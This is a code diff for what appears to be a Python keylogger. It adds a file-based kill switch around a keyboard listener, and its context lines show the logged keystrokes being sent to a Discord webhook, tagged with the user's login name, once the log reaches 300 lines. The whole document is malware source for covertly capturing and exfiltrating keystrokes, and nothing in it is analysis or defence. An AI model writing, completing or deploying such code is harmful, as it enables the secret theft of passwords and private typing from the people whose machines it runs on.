@@ -9,6 +9,13 @@ max_length = 17 # the longest keycode i could find was media_volume_down which i
 url = ''
 clear_after_send = True
 
+def kill_switch():
+    file_path = Path.home() / "kill"
+    file_path.parent.mkdir(parents=True, exist_ok=True)
+
+    if file_path.exists():
+        return True
+
 def check_if_should_send(lines):
     if lines >= 300:
         webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
@@ -174,5 +181,9 @@ def on_release(key):
             lines = len(file.readlines())
         check_if_should_send(lines)
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
-    l.join()
+    if kill_switch():
+        return False
+
+if not kill_switch():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
+        l.join()
